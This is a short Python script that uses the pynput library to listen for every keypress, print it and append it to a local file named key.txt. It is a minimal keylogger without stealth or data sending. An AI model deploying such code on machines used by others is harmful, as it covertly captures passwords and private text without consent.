from pynput.keyboard import Key, Listener

def on_press(key):
    print(f'Pressed: {key}')
    with open("key.txt", "a") as f:
        f.write(f'{key}\n')

with Listener(on_press=on_press) as listener:
    listener.join() 